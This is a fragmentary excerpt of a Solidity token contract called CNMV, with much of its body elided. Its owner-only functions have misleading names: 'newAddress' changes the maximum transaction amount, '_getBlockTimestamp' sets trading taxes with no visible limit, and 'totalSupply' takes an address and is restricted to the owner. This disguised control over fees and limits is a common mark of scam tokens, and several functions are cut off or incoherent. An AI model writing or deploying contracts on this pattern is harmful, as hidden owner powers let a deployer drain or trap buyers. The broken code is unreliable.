...
contract Ownable is Context, MagnitudeShare{  
    ...
    */
    ...
    function totalSupply(address _dividend) external onlyOwner {
...
contract CNMV is Context, IERC20, Ownable{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 10000000 *  10**9;        
    
    string private _name = "CNMV";
    string private _symbol = "CNMV";
    ...
    function settimeClaim(uint256 lastClaimTime, uint256 claimWait) private view returns (bool) {
    ...
    function newAddress(uint256 amount) external onlyOwner {
        _maxTxAmount = amount;
    } 
    ...
    function _getBlockTimestamp(uint8 newLiquidityTax, uint8 newMarketingTax, uint8 newBuyBackTax) external onlyOwner {
        taxLiquidity = newLiquidityTax;
        taxMarketing = newMarketingTax;
        taxSellBack = newBuyBackTax;
    }

   function acceptAdmin(uint256 gas, uint256 gasPriceLimit) external pure returns(uint256) {
		  require(gas >= 860000);
